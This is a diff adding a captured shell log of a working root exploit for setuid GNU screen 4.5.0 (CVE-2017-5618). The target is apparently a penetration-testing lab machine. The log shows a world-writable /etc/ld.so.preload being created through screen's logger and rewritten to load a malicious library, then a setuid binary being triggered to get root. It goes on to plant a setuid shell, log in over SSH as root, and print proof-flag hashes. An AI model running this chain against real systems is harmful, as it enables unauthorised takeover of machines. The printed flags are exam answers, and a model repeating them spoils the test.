@@ -1,0 +1,74 @@
+# CVE-2017-5618 — setuid screen 4.5.0 -> root
+# Captured 2026-11-22 against 192.168.150.143 (as user aero)
+
+# --- the contradiction: package says 4.8.0, binary is 4.5.0 -----------------
+$ dpkg -l | grep -E "^ii  (screen|policykit)"
+ii  policykit-1   0.105-26ubuntu1.3  amd64  framework for managing administrative policies and privileges
+ii  screen        4.8.0-1ubuntu0.1   amd64  terminal multiplexer with VT100/ANSI terminal emulation
+
+$ ls -la /usr/bin/screen*
+lrwxrwxrwx 1 root root      12 May 10  2021 /usr/bin/screen -> screen-4.5.0
+-rwsr-xr-x 1 root root 1860304 May 10  2021 /usr/bin/screen-4.5.0
+-rwxr-xr-x 1 root root  474280 Feb 23  2021 /usr/bin/screen.old
+
+# --- setuid inventory ------------------------------------------------------
+$ find /usr/bin /usr/sbin /bin /sbin /opt /home /usr/local -perm -4000 -type f 2>/dev/null | sort
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/screen-4.5.0
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/umount
+
+# --- create a root-owned, world-writable ld.so.preload ---------------------
+$ cd /etc && umask 000 && screen -D -m -L ld.so.preload /bin/sh -c 'printf "\n/tmp/screenroot/libhax.so\n"' >/dev/null 2>&1
+$ stat -c "%A %U:%G %s %n" /etc/ld.so.preload
+-rw-rw-rw- root:aero 29 /etc/ld.so.preload
+
+# --- trap: screen's logger writes CRLF, so ld.so rejects the path ----------
+$ cat /etc/ld.so.preload
+ERROR: ld.so: object '\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+ERROR: ld.so: object '/tmp/screenroot/libhax.so\r' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+
+# --- rewrite clean (possible only because the mode is 0666) ---------------
+$ printf "/tmp/screenroot/libhax.so\n" > /etc/ld.so.preload && echo WRITE_OK
+WRITE_OK
+$ cat -A /etc/ld.so.preload
+/tmp/screenroot/libhax.so$
+
+# --- trigger: any setuid binary reads the preload list -------------------
+$ screen -ls >/dev/null 2>&1; sleep 2
+
+$ ls -la /etc/ld.so.preload
+ls: cannot access '/etc/ld.so.preload': No such file or directory      # payload unlinks it on purpose
+
+$ cat /tmp/screenroot/rootout.txt
+uid=0(root) gid=0(root) groups=0(root)
+lab-pwk2-student-cl4-143-ubuntu20-aero-242-100
+--- proof.txt ---
+7fd0bd2e18b52d791a6600fbd8e622b7
+--- artifacts ---
+total 1188
+drwxrwxrwx  2 aero aero    4096 Nov 22 05:42 .
+drwxrwxrwt 19 root root    4096 Nov 22 05:41 ..
+-rw-------  1 root root       0 Nov 22 05:42 .lock
+-rwxr-xr-x  1 aero aero   14264 Nov 22 05:39 libhax.so
+-rwsr-xr-x  1 root root 1183448 Nov 22 05:42 rbash
+-rwxr-xr-x  1 aero aero     173 Nov 22 05:39 rootcmd.sh
+-rw-r--r--  1 root root     155 Nov 22 05:42 rootout.txt
+
+# --- interactive root session -------------------------------------------
+$ ssh -i /tmp/exam_key root@192.168.150.143
+root@lab-pwk2-student-cl4-143-ubuntu20-aero-242-100:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@...# cat /root/proof.txt
+7fd0bd2e18b52d791a6600fbd8e622b7
+root@...# cat /home/aero/local.txt
+8d0b2414df3c73b491d05711c000a9d6
